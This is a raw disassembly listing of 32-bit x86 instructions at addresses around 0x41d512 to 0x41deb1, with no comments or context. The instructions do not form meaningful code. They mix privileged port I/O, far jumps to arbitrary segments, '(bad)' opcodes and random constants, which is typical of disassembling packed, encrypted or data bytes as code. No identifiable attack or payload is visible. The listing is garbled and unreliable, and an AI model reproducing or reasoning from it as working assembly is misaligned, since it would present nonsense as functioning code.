  41d512:	int    0x82
  41d514:	sub    eax,0x4e2b3387
  41d519:	mov    ebx,DWORD PTR [ecx+0x5f]
  41d51c:	ror    BYTE PTR [ebp-0x80],0x4e
  41d520:	jp     0x41d57c
  41d522:	inc    esp
  41d523:	jecxz  0x41d4c5
  41d525:	rcl    esi,1
  41d527:	ficom  WORD PTR [esp+eax*1+0x15c11b70]
  41d52e:	in     eax,0x45
  41d530:	lahf   
  41d531:	fiadd  WORD PTR [ebx+0x2e]
  41d534:	dec    esp
  41d535:	jbe    0x41d58f
  41d537:	rol    BYTE PTR [esi+ebx*4+0x5e],1
  41d53b:	out    0xfa,al
  41d53d:	call   0x3dd8:0x4a2b96f8
  41d544:	jl     0x41d5a7
  41d546:	cs repnz push ds
  41d549:	lds    ebx,FWORD PTR [edi-0x7ba5fd33]
  41d54f:	add    BYTE PTR [edi+0x6fb90186],0x5d
  41d556:	mov    ch,0x80
  41d558:	lds    ebp,FWORD PTR [esi-0x60]
  41d55b:	push   cs
  41d55c:	fdivr  QWORD PTR [esp+ebx*1]
  41d55f:	push   ss
  41d560:	cs mov edi,0xd1deb47b
  41d566:	das    
  41d567:	xor    BYTE PTR [ebx-0x581b695b],dh
  41d56d:	inc    esp
  41d56e:	push   ss
  41d56f:	inc    ecx
  41d570:	xor    ch,BYTE PTR [edi-0x2a]
  41d573:	xor    DWORD PTR [edx-0x79d1af07],0x8ed607a2
  41d57d:	pop    ebx
  41d57e:	xlat   BYTE PTR ds:[ebx]
  41d57f:	cmp    ebp,esi
  41d581:	adc    al,0x9b
  41d583:	popa   
  41d584:	dec    esp
  41d585:	cli    
  41d586:	stos   DWORD PTR es:[edi],eax
  41d587:	stos   DWORD PTR es:[edi],eax
  41d588:	das    
  41d589:	aad    0xac
  41d58b:	push   0xffffffe2
  41d58d:	arpl   dx,bx
  41d58f:	in     al,0x9e
  41d591:	mov    eax,0x7e97378f
  41d596:	jl     0x41d56f
  41d598:	test   BYTE PTR [eax+0x70],bh
  41d59b:	fst    QWORD PTR ds:0x8ec4f3bc
  41d5a1:	and    DWORD PTR [edx+0x2d],ebp
  41d5a4:	jb     0x41d593
  41d5a6:	in     al,0x47
  41d5a8:	dec    ebp
  41d5a9:	xchg   esp,eax
  41d5aa:	fs xchg ah,dl
  41d5ad:	pop    ds
  41d5ae:	xchg   ebx,eax
  41d5af:	shr    DWORD PTR [ecx],0x3b
  41d5b2:	add    BYTE PTR [eax],bl
  41d5b4:	in     eax,dx
  41d5b5:	test   DWORD PTR [ebx+0x25],0xe283d118
  41d5bc:	mov    ch,0x9
  41d5be:	or     BYTE PTR [ecx-0xa67bb41],ah
  41d5c4:	stos   DWORD PTR es:[edi],eax
  41d5c5:	test   eax,0x29328e06
  41d5ca:	int    0xc
  41d5cc:	pop    ecx
  41d5cd:	sbb    eax,0x215ddac6
  41d5d2:	call   0x68b42c53
  41d5d7:	cmp    al,0x0
  41d5d9:	sub    BYTE PTR [esi+0x7de3b67c],ch
  41d5df:	shl    edi,1
  41d5e1:	jne    0x41d582
  41d5e3:	push   ss
  41d5e4:	xor    DWORD PTR [ecx],ebp
  41d5e6:	ret    0xe983
  41d5e9:	adc    edi,DWORD PTR [esi-0x245bed53]
  41d5ef:	jo     0x41d5e9
  41d5f1:	loope  0x41d648
  41d5f3:	lods   al,BYTE PTR ds:[esi]
  41d5f4:	retfw  0xd1ce
  41d5f8:	(bad)  
  41d5f9:	adc    ebx,edi
  41d5fb:	out    0x3b,eax
  41d5fd:	fadd   st(4),st
  41d5ff:	repnz jmp 0xd904:0xd7b9e7f7
  41d607:	jns    0x41d5dc
  41d609:	push   es
  41d60a:	mov    al,ds:0x2d87913f
  41d60f:	cmc    
  41d610:	out    0x0,al
	...
  41d672:	add    BYTE PTR [eax],al
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0xe666e435
  41d681:	push   cs
  41d682:	pushf  
  41d683:	or     al,0xd5
  41d685:	cmp    BYTE PTR [ecx],al
  41d687:	add    BYTE PTR ds:0xd9000001,al
  41d68d:	or     ecx,DWORD PTR [esi]
  41d68f:	repz aad 0xbc
  41d692:	push   ebp
  41d693:	mov    bh,BYTE PTR [eax+0x7d3d0dd8]
  41d699:	pop    esi
  41d69a:	cmp    BYTE PTR [edi+0x55],al
  41d69d:	retf   0xbbe0
  41d6a0:	push   ebp
  41d6a1:	mov    dl,0x7f
  41d6a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6a4:	dec    ebp
  41d6a5:	jno    0x41d725
  41d6a7:	push   ss
  41d6a8:	mov    ebp,0xe858c9ca
  41d6ad:	mov    al,0x72
  41d6af:	in     eax,0x40
  41d6b1:	daa    
  41d6b2:	xchg   esp,eax
  41d6b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6b4:	cmp    esp,ebp
  41d6b6:	push   ebp
  41d6b7:	enter  0xb1b1,0xc7
  41d6bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6bc:	scas   al,BYTE PTR es:[edi]
  41d6bd:	loop   0x41d728
  41d6bf:	cwde   
  41d6c0:	fcomp  DWORD PTR [edx-0x64b42785]
  41d6c6:	in     eax,0x80
  41d6c8:	sub    esi,DWORD PTR [ecx]
  41d6ca:	ret    0xe4a7
  41d6cd:	test   al,0xc0
  41d6cf:	and    BYTE PTR [edi-0x5],0xe2
  41d6d3:	mov    dh,0xc4
  41d6d5:	fdiv   DWORD PTR [eax-0x120f6524]
  41d6db:	dec    ebx
  41d6dc:	dec    ecx
  41d6dd:	sbb    al,0x99
  41d6df:	scas   al,BYTE PTR es:[edi]
  41d6e0:	add    BYTE PTR [ebp+edi*8+0x2ab8a953],dl
  41d6e7:	mov    dh,0xd
  41d6e9:	pop    ebp
  41d6ea:	jmp    0xbbb0:0xf5db9524
  41d6f1:	jno    0x41d76d
  41d6f3:	pop    esp
  41d6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6f5:	xchg   esp,eax
  41d6f6:	(bad)  
  41d6f8:	lds    ebx,FWORD PTR [ecx]
  41d6fa:	inc    ebp
  41d6fb:	adc    bl,BYTE PTR [ebp+edx*2-0x2f]
  41d6ff:	loope  0x41d6cd
  41d701:	sub    BYTE PTR [eax+0x79efb0c0],ah
  41d707:	test   eax,0xacae2b7a
  41d70c:	js     0x41d698
  41d70e:	xchg   edi,eax
  41d70f:	adc    eax,0x72e67b43
  41d714:	push   cs
  41d715:	jnp    0x41d6af
  41d717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d718:	or     BYTE PTR [esi-0x1f749074],0x6
  41d71f:	sti    
  41d720:	test   DWORD PTR [edx],esi
  41d722:	jmp    0xf3b:0xc6270e78
  41d729:	push   cs
  41d72a:	cmp    al,0xaf
  41d72c:	xchg   edi,esi
  41d72e:	mov    al,ds:0x42aecc6f
  41d733:	inc    ecx
  41d734:	add    ecx,edi
  41d736:	cli    
  41d737:	or     BYTE PTR [ebx],0x99
  41d73a:	dec    esp
  41d73b:	xor    BYTE PTR [eax],0x2a
  41d73e:	cmp    DWORD PTR [ecx],edx
  41d740:	sub    edx,edx
  41d742:	mov    ss,WORD PTR [ebx]
  41d744:	add    eax,ecx
  41d746:	mov    eax,ds:0xbfe43e04
  41d74b:	sub    eax,0x282d8a88
  41d750:	push   cs
  41d751:	outs   dx,BYTE PTR ds:[esi]
  41d752:	out    dx,al
  41d753:	mov    ebx,0xe24d29a7
  41d758:	test   BYTE PTR [eax-0x4e],bl
  41d75b:	cmp    BYTE PTR cs:[edi-0xbc552f1],cl
  41d762:	dec    esi
  41d763:	push   edx
  41d764:	pop    esi
  41d765:	in     al,dx
  41d766:	dec    edi
  41d767:	mov    DWORD PTR [esi+0x4aafb849],0x5109d6bb
  41d771:	frndint 
  41d773:	add    DWORD PTR [esi+esi*4+0x289f5ec0],eax
  41d77a:	sbb    eax,0x9d51c6b2
  41d77f:	(bad)  
  41d780:	jg     0x41d717
  41d782:	test   DWORD PTR [ebx],ecx
  41d784:	js     0x41d733
  41d786:	(bad)  
  41d787:	(bad)  [ebx-0x42e4071b]
  41d78d:	push   eax
  41d78e:	jo     0x41d761
  41d790:	sub    BYTE PTR [eax],al
	...
  41d7f2:	add    BYTE PTR [eax],al
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	add    ah,dh
  41d802:	ds cmp dl,bl
  41d805:	cmp    DWORD PTR [ecx],eax
  41d807:	add    BYTE PTR ds:0xa5000001,al
  41d80d:	std    
  41d80e:	cmp    edx,DWORD PTR [esi-0x57]
  41d811:	(bad)  
  41d812:	ret    
  41d813:	add    ebx,esi
  41d815:	push   esp
  41d816:	daa    
  41d817:	pop    ecx
  41d818:	xchg   esi,eax
  41d819:	jmp    0x1162:0x782715bd
  41d820:	(bad)  
  41d821:	jle    0x41d7b1
  41d823:	cwde   
  41d824:	mov    bl,0x78
  41d826:	push   esi
  41d827:	mov    bh,0xb1
  41d829:	in     eax,dx
  41d82a:	lea    esi,[edi+0x1]
  41d82d:	mov    ebp,0x242312a5
  41d832:	shr    BYTE PTR [esi],cl
  41d834:	mov    bl,0x53
  41d836:	push   ebp
  41d837:	shl    BYTE PTR [ecx-0x6ab72fa4],cl
  41d83d:	dec    edi
  41d83e:	pop    edi
  41d83f:	sti    
  41d840:	or     cl,BYTE PTR [eax-0x60258915]
  41d846:	adc    esi,0xf216f7d0
  41d84c:	xor    ah,bh
  41d84e:	mov    WORD PTR [ebp+0x19],gs
  41d851:	cmp    al,0x85
  41d853:	fcmovu st,st(5)
  41d855:	lock repz sbb al,0x15
  41d859:	mov    esi,0x423a68c0
  41d85f:	iret   
  41d860:	jbe    0x41d815
  41d862:	lods   al,BYTE PTR ds:[esi]
  41d863:	inc    esp
  41d864:	push   ss
  41d865:	stc    
  41d866:	pop    ebp
  41d867:	pop    edi
  41d868:	xchg   ebp,eax
  41d869:	(bad)  
  41d86a:	(bad)  
  41d86b:	in     eax,dx
  41d86c:	imul   DWORD PTR [eax]
  41d86e:	inc    edi
  41d86f:	xor    dh,BYTE PTR [eax]
  41d871:	xchg   esi,eax
  41d872:	or     al,0x9f
  41d874:	sbb    bl,dh
  41d876:	ficom  DWORD PTR [edi]
  41d879:	xor    BYTE PTR [eax-0x6e3ce41a],al
  41d87f:	arpl   WORD PTR [eax+ebx*8],bp
  41d882:	in     eax,dx
  41d883:	dec    esi
  41d884:	cdq    
  41d885:	les    esp,FWORD PTR [edx+0x44e9b5a3]
  41d88b:	sahf   
  41d88c:	mov    cs,WORD PTR [edx+0x49]
  41d88f:	cld    
  41d890:	scas   al,BYTE PTR es:[edi]
  41d891:	jg     0x41d8dc
  41d893:	push   eax
  41d894:	fist   WORD PTR [esi+ebx*1-0x80]
  41d898:	push   0x274a8f77
  41d89d:	lds    edx,FWORD PTR [ecx+esi*2-0x761bded4]
  41d8a4:	das    
  41d8a5:	aas    
  41d8a6:	sbb    DWORD PTR [esi-0x49df660a],edx
  41d8ac:	outs   dx,BYTE PTR ds:[esi]
  41d8ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8af:	fstp   DWORD PTR [ecx+ecx*1]
  41d8b2:	inc    ebp
  41d8b3:	inc    eax
  41d8b4:	imul   edx,DWORD PTR [ebx],0x6f1aa1f6
  41d8ba:	jge    0x41d88c
  41d8bc:	and    eax,0x7dbff378
  41d8c1:	jo     0x41d8ac
  41d8c3:	data16 mov cl,0xce
  41d8c6:	sub    eax,0x7a4680b1
  41d8cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8cc:	and    DWORD PTR [ebx+ebp*2+0x57],0xffffffdc
  41d8d1:	ins    DWORD PTR es:[edi],dx
  41d8d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8d3:	out    dx,al
  41d8d4:	xchg   DWORD PTR [ebx],ecx
  41d8d6:	clc    
  41d8d7:	sub    al,0x43
  41d8d9:	mov    cl,0x21
  41d8db:	pusha  
  41d8dc:	mov    edi,0x78bddb9
  41d8e1:	add    BYTE PTR [ecx],ch
  41d8e3:	xchg   esp,eax
  41d8e4:	shl    ch,0xde
  41d8e7:	inc    esp
  41d8e8:	xchg   BYTE PTR [esi-0x553c2af7],bl
  41d8ee:	outs   dx,BYTE PTR ds:[esi]
  41d8ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8f0:	push   ds
  41d8f1:	ins    DWORD PTR es:[edi],dx
  41d8f2:	loope  0x41d8f5
  41d8f4:	repnz cmc 
  41d8f6:	in     al,dx
  41d8f7:	xchg   BYTE PTR [ebp+0x226c7233],bh
  41d8fd:	int    0xd0
  41d8ff:	push   0xdd1801c2
  41d904:	mov    WORD PTR [eax],gs
  41d906:	cmp    eax,edx
  41d908:	jb     0x41d91b
  41d90a:	in     eax,0xa2
  41d90c:	xchg   ebx,eax
  41d90d:	add    DWORD PTR [esi+0x59],ebx
  41d910:	sahf   
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs xor eax,0xdf11c463
  41d985:	cmp    al,BYTE PTR [ecx]
  41d987:	add    BYTE PTR ds:0xda000001,al
  41d98d:	cmp    BYTE PTR [ecx],0x50
  41d990:	ins    DWORD PTR es:[edi],dx
  41d991:	outs   dx,BYTE PTR ds:[esi]
  41d992:	cmp    eax,0x8081d922
  41d997:	sub    al,0x94
  41d999:	jg     0x41d96d
  41d99b:	cld    
  41d99c:	dec    edi
  41d99d:	das    
  41d99e:	dec    ebp
  41d99f:	out    0xb3,eax
  41d9a1:	mov    WORD PTR [ebx-0x3a],fs
  41d9a4:	jns    0x41d9b0
  41d9a6:	aam    0x24
  41d9a8:	popa   
  41d9a9:	jne    0x41d995
  41d9ab:	je     0x41da13
  41d9ad:	xchg   esi,eax
  41d9ae:	push   0x32
  41d9b0:	ins    DWORD PTR es:[edi],dx
  41d9b1:	dec    eax
  41d9b2:	sub    eax,0xb3e692df
  41d9b7:	pop    es
  41d9b8:	mov    dh,0x41
  41d9ba:	cdq    
  41d9bb:	aam    0x87
  41d9bd:	xchg   esp,eax
  41d9be:	icebp  
  41d9bf:	loopne 0x41d974
  41d9c1:	outs   dx,DWORD PTR ds:[esi]
  41d9c2:	loope  0x41d9a4
  41d9c4:	jmp    0x346cddab
  41d9c9:	out    dx,eax
  41d9ca:	sub    edi,DWORD PTR es:[eax-0x1be93f13]
  41d9d1:	push   0xf4d2c72a
  41d9d6:	cmp    DWORD PTR [eax+0x7cfe598e],edi
  41d9dc:	scas   eax,DWORD PTR es:[edi]
  41d9dd:	or     ebx,esi
  41d9df:	cmp    edx,DWORD PTR [esi+0x2978afab]
  41d9e5:	sar    BYTE PTR [ebx],1
  41d9e7:	push   ds
  41d9e8:	test   DWORD PTR es:[esi-0x43],ecx
  41d9ec:	ins    BYTE PTR es:[edi],dx
  41d9ed:	arpl   WORD PTR [ecx],sp
  41d9ef:	mov    al,ds:0xafb42873
  41d9f4:	retf   
  41d9f5:	sti    
  41d9f6:	push   ebx
  41d9f7:	sub    ebp,DWORD PTR [edx+0x4c1d6373]
  41d9fd:	add    DWORD PTR ds:0x3e365c8,edi
  41da03:	fist   DWORD PTR [ebx-0x2b257b84]
  41da09:	pop    edi
  41da0a:	dec    esp
  41da0b:	mov    al,ds:0xf0bead4f
  41da10:	pop    es
  41da11:	jns    0x41da70
  41da13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da14:	push   esp
  41da15:	hlt    
  41da16:	xor    eax,0xc353c1f
  41da1b:	into   
  41da1c:	rcr    al,0x76
  41da1f:	or     ebx,DWORD PTR [edi-0x52]
  41da22:	xchg   BYTE PTR [eax+0x6b039267],dh
  41da28:	pushw  cs
  41da2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da2b:	(bad)  
  41da2c:	retf   0x8a1b
  41da2f:	push   ss
  41da30:	xor    BYTE PTR [esi-0x2],dl
  41da33:	aam    0xb6
  41da35:	rol    DWORD PTR [ecx],1
  41da37:	or     DWORD PTR [ebp+ecx*1+0x504201b],ebp
  41da3e:	mov    edx,?
  41da40:	test   al,0x68
  41da42:	and    DWORD PTR [ecx],0xfffffff2
  41da45:	xchg   ebp,eax
  41da46:	and    edx,esi
  41da48:	lea    esi,[eax+ebx*8+0x5a457f0a]
  41da4f:	fsub   DWORD PTR [edi]
  41da51:	clc    
  41da52:	xor    edx,DWORD PTR [eax-0x3357282]
  41da58:	hlt    
  41da59:	xor    bh,BYTE PTR [eax-0x21]
  41da5c:	ret    
  41da5d:	inc    edi
  41da5e:	xchg   DWORD PTR [edx+0x3bb94fd3],edi
  41da64:	int3   
  41da65:	adc    al,0xd8
  41da67:	mov    al,BYTE PTR [ebp+0x69fc486d]
  41da6d:	or     BYTE PTR [ecx-0x4c],0x40
  41da71:	addr16 mov bh,0x28
  41da74:	bound  edi,QWORD PTR [ebx+ebp*1]
  41da77:	push   0x49ec1cac
  41da7c:	xor    BYTE PTR [edi],bl
  41da7e:	ror    DWORD PTR [esi-0x7e2d245d],0x14
  41da85:	mov    dl,0x45
  41da87:	mov    ds:0xf27d68c4,eax
  41da8c:	popf   
  41da8d:	loopne 0x41da12
  41da8f:	ror    BYTE PTR [eax+eax*1+0x0],1
	...
  41daf3:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xffffff95
  41db01:	cmp    eax,0x3be419f1
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    eax,0x2c000001
  41db0d:	loop   0x41dacf
  41db0f:	mov    bl,0x0
  41db11:	scas   al,BYTE PTR es:[edi]
  41db12:	aas    
  41db13:	mov    DWORD PTR [edi-0x64],ebx
  41db16:	add    BYTE PTR [ecx],cl
  41db18:	ja     0x41db5b
  41db1a:	pop    ebx
  41db1b:	and    eax,0xd63d1d8d
  41db20:	sti    
  41db21:	mov    bh,0x18
  41db23:	cmp    dh,BYTE PTR [esi]
  41db25:	das    
  41db26:	repz ret 0x32ce
  41db2a:	into   
  41db2b:	sbb    eax,0x26bfbd0b
  41db30:	pop    ebp
  41db31:	or     ebx,edi
  41db33:	repnz fsubr QWORD PTR ds:0x86cae9aa
  41db3a:	adc    BYTE PTR [ebp+0x44155fa6],bl
  41db40:	mov    edx,0xb1f51fca
  41db45:	xchg   bh,al
  41db47:	or     edx,eax
  41db49:	cli    
  41db4a:	xchg   esp,eax
  41db4b:	sub    DWORD PTR [ebp+0x45779c09],esp
  41db51:	mov    ebx,0xfcf957a9
  41db56:	pop    ds
  41db57:	sub    cl,BYTE PTR [eax-0x9f7fb4f]
  41db5d:	cwde   
  41db5e:	mov    ch,0x55
  41db60:	ret    
  41db61:	or     bh,al
  41db63:	test   eax,0x5f117be6
  41db68:	push   ebp
  41db69:	jmp    0xbe3f3a46
  41db6e:	xlat   BYTE PTR ds:[ebx]
  41db6f:	popa   
  41db70:	ins    BYTE PTR es:[edi],dx
  41db71:	adc    BYTE PTR [esi],bh
  41db73:	mov    ds:0x4fb86a33,eax
  41db78:	add    DWORD PTR [ecx],eax
  41db7a:	js     0x41dbd5
  41db7c:	fdiv   DWORD PTR [esi+0x5]
  41db7f:	inc    esi
  41db80:	fcom   QWORD PTR [ebx]
  41db82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db83:	add    bh,dh
  41db85:	arpl   WORD PTR [ecx-0x15],bp
  41db88:	cmp    dh,bl
  41db8a:	ins    BYTE PTR es:[edi],dx
  41db8b:	add    DWORD PTR [edx],ebp
  41db8d:	push   cs
  41db8e:	shl    DWORD PTR [eax],1
  41db90:	sbb    ah,BYTE PTR [edx-0x76]
  41db93:	push   ebp
  41db94:	cwde   
  41db95:	data16 stc 
  41db97:	ret    
  41db98:	add    eax,0x9a44cbaf
  41db9d:	pop    eax
  41db9e:	mov    dh,0xb4
  41dba0:	fcomi  st,st(0)
  41dba2:	cdq    
  41dba3:	dec    ebp
  41dba4:	xor    cl,al
  41dba6:	ja     0x41db4c
  41dba8:	mov    esi,0x7522f98e
  41dbad:	xchg   al,bl
  41dbaf:	mov    WORD PTR [edx],gs
  41dbb1:	ror    BYTE PTR [ebx-0x2b],0xb9
  41dbb5:	hlt    
  41dbb6:	lods   eax,DWORD PTR ds:[esi]
  41dbb7:	nop
  41dbb8:	cdq    
  41dbb9:	mov    ?,WORD PTR [esi]
  41dbbb:	out    dx,eax
  41dbbc:	addr16 aad 0xfa
  41dbbf:	pop    ds
  41dbc0:	and    eax,0x17982764
  41dbc5:	fsubp  st(6),st
  41dbc7:	not    BYTE PTR [esi+0x77]
  41dbca:	(bad)  
  41dbcc:	pop    ebp
  41dbcd:	sbb    ecx,DWORD PTR cs:[edx-0x47]
  41dbd1:	dec    eax
  41dbd2:	xor    BYTE PTR [edi+0x4836b44d],dh
  41dbd8:	call   0x753bbbb0
  41dbdd:	test   al,0x80
  41dbdf:	(bad)  
  41dbe0:	xor    BYTE PTR [edx+0x649dccfc],dl
  41dbe6:	out    0x3e,al
  41dbe8:	lods   eax,DWORD PTR ss:[esi]
  41dbea:	sahf   
  41dbeb:	sbb    esp,ebp
  41dbed:	sbb    esi,DWORD PTR [eax+0x6b829d94]
  41dbf3:	call   0xb1d6bcca
  41dbf8:	dec    eax
  41dbf9:	and    DWORD PTR ds:0xa46b7154,ecx
  41dbff:	add    ebx,DWORD PTR [esi+0x79a20e3d]
  41dc05:	mov    al,ds:0x7848e694
  41dc0a:	bound  edx,QWORD PTR ds:0xcb4b078
  41dc10:	loopne 0x41dc12
	...
  41dc72:	add    BYTE PTR [eax],al
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi-0x384f2fb0]
  41dc81:	push   0x4f
  41dc83:	add    ebp,ecx
  41dc85:	cmp    al,0x1
  41dc87:	add    BYTE PTR ds:0x5000001,al
  41dc8d:	sbb    al,0x9b
  41dc8f:	mov    ch,0x91
  41dc91:	adc    dh,cl
  41dc93:	es add al,0xd3
  41dc96:	and    ebp,DWORD PTR [edi-0x9]
  41dc99:	xchg   edx,eax
  41dc9a:	clc    
  41dc9b:	icebp  
  41dc9c:	sub    BYTE PTR [esi+0xeffd9ab],0x39
  41dca3:	mov    cl,0x7c
  41dca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dca6:	pop    eax
  41dca7:	ins    DWORD PTR es:[edi],dx
  41dca8:	stc    
  41dca9:	dec    ebp
  41dcaa:	cs mov ebx,0x24ac4eb9
  41dcb0:	xchg   edx,eax
  41dcb1:	jns    0x41dc54
  41dcb3:	popa   
  41dcb4:	scas   eax,DWORD PTR es:[edi]
  41dcb5:	in     al,dx
  41dcb6:	push   ecx
  41dcb7:	jmp    0x41dce3
  41dcb9:	add    bh,BYTE PTR [ebx+0x63]
  41dcbc:	sbb    BYTE PTR [ebx+0x595826fd],ah
  41dcc2:	jl     0x41dd2e
  41dcc4:	ins    BYTE PTR es:[edi],dx
  41dcc5:	sahf   
  41dcc6:	lds    esp,FWORD PTR [eax]
  41dcc8:	mov    bl,0xab
  41dcca:	sbb    bh,BYTE PTR [ecx]
  41dccc:	mov    edi,0x8ca8b07f
  41dcd1:	mov    ecx,DWORD PTR [esp+edi*4+0x692dcda6]
  41dcd8:	rcr    ebp,1
  41dcda:	call   0xfd66b9ca
  41dcdf:	retf   
  41dce0:	and    cl,BYTE PTR [ecx+0x1d370fd3]
  41dce6:	push   edx
  41dce7:	mov    bh,0xc5
  41dce9:	push   0xffffffd2
  41dceb:	xor    al,0x21
  41dced:	xchg   esi,eax
  41dcee:	mov    esi,0xbbea4464
  41dcf3:	cmp    BYTE PTR [ecx],ah
  41dcf5:	scas   eax,DWORD PTR es:[edi]
  41dcf6:	or     DWORD PTR [edx],esp
  41dcf8:	lahf   
  41dcf9:	jmp    0x41dcd9
  41dcfb:	and    al,0xaf
  41dcfd:	mov    esi,0x47d4e704
  41dd02:	push   0xa985b336
  41dd07:	push   0xa
  41dd09:	dec    eax
  41dd0a:	cmp    al,0x6c
  41dd0c:	dec    edx
  41dd0d:	mov    BYTE PTR [esi],bl
  41dd0f:	jmp    0x65f863b0
  41dd14:	es push ebx
  41dd16:	sub    ebx,edx
  41dd18:	xchg   edx,eax
  41dd19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd1a:	fild   WORD PTR [ebx-0x617c0c1d]
  41dd20:	in     eax,dx
  41dd21:	mov    ds:0x53151695,al
  41dd26:	sysexit 
  41dd28:	loop   0x41dcb0
  41dd2a:	and    DWORD PTR [eax],ebp
  41dd2c:	icebp  
  41dd2d:	jp     0x41dcf3
  41dd2f:	push   edi
  41dd30:	pop    esi
  41dd31:	ds ds jne 0x41dd75
  41dd35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd36:	sub    BYTE PTR [ecx],dh
  41dd38:	leave  
  41dd39:	daa    
  41dd3a:	add    DWORD PTR [edx+0x6bee97a3],ebx
  41dd40:	pushf  
  41dd41:	push   cs
  41dd42:	cwde   
  41dd43:	inc    esi
  41dd44:	push   0xa85768e6
  41dd49:	dec    esp
  41dd4a:	ss push cs
  41dd4c:	(bad)  
  41dd4d:	mov    ds:0xcc2d6220,al
  41dd52:	push   edx
  41dd53:	and    BYTE PTR [ebx+0x73],cl
  41dd56:	sub    eax,0x7820e83
  41dd5b:	inc    eax
  41dd5c:	rcr    DWORD PTR [eax+0x3],0x97
  41dd60:	sahf   
  41dd61:	lods   al,BYTE PTR ds:[esi]
  41dd62:	in     eax,0xe
  41dd64:	mov    BYTE PTR [ebp+0x8e80633],0xc7
  41dd6b:	and    eax,0xee5e255c
  41dd70:	mov    ecx,0x3bc850ed
  41dd75:	call   0xf384a5fa
  41dd7a:	ds out 0x41,al
  41dd7d:	fs pop ds
  41dd7f:	mov    eax,ds:0x437b549d
  41dd84:	or     eax,0x4bc22bd
  41dd89:	mov    al,ds:0x22921d02
  41dd8e:	and    ecx,DWORD PTR [ecx+0x3d]
	...
  41ddf1:	add    BYTE PTR [eax],al
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	xchg   BYTE PTR [edi+edi*1+0x13dee94],ch
  41de07:	add    BYTE PTR ds:0x8d000001,al
  41de0d:	out    dx,eax
  41de0e:	add    al,0xa5
  41de10:	xor    bh,ah
  41de12:	mov    bl,0xe7
  41de14:	jb     0x41ddb0
  41de16:	daa    
  41de17:	jmp    0xaad6:0x52a5d545
  41de1e:	jne    0x41ddd0
  41de20:	mov    bh,0xc2
  41de22:	fs loopne 0x41de70
  41de25:	adc    eax,0xdab16eeb
  41de2a:	push   es
  41de2b:	dec    esp
  41de2c:	mov    bl,0xa
  41de2e:	aad    0xc1
  41de30:	loope  0x41de55
  41de32:	add    eax,0x45a40881
  41de37:	popf   
  41de38:	mov    ebx,0x3e358623
  41de3d:	dec    ebp
  41de3e:	add    BYTE PTR [edx+ecx*1-0x5c55d7f3],cl
  41de45:	aad    0x98
  41de47:	mov    ch,0xb0
  41de49:	push   esp
  41de4a:	lods   eax,DWORD PTR ds:[esi]
  41de4b:	xor    eax,0x745b33f1
  41de50:	add    BYTE PTR [edi+0x6b],ah
  41de53:	cli    
  41de54:	xor    BYTE PTR [edx+0x23],0x4b
  41de58:	and    ebx,ebp
  41de5a:	jmp    0x2e6ee35a
  41de5f:	fadd   st(0),st
  41de61:	pop    eax
  41de62:	push   0x36
  41de64:	and    edx,eax
  41de66:	and    eax,0x1d2d31ee
  41de6b:	es jmp 0x5262acef
  41de71:	push   esp
  41de72:	cmp    eax,0xcabbb3d1
  41de77:	rol    BYTE PTR [esi+0x78],0x67
  41de7b:	outs   dx,DWORD PTR ds:[esi]
  41de7c:	jo     0x41de94
  41de7e:	rcr    ebp,cl
  41de80:	jae    0x41de76
  41de82:	gs std 
  41de84:	retf   0xb7fc
  41de87:	outs   dx,BYTE PTR ds:[esi]
  41de88:	enter  0x1cdc,0x23
  41de8c:	mov    dh,0x2b
  41de8e:	jne    0x41def6
  41de90:	xchg   ecx,eax
  41de91:	add    dl,0xd9
  41de94:	(bad)  
  41de95:	sub    esp,DWORD PTR [eax-0x1b]
  41de98:	mov    edi,0x2235ce89
  41de9d:	fist   WORD PTR ds:0x2c115976
  41dea3:	add    ch,dh
  41dea5:	and    ah,al
  41dea7:	fst    QWORD PTR [eax-0x6e]
  41deaa:	or     al,0x67
  41deac:	inc    ecx
  41dead:	cmp    esi,eax
  41deaf:	inc    esp
  41deb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deb1:	loopne 0x41df2d
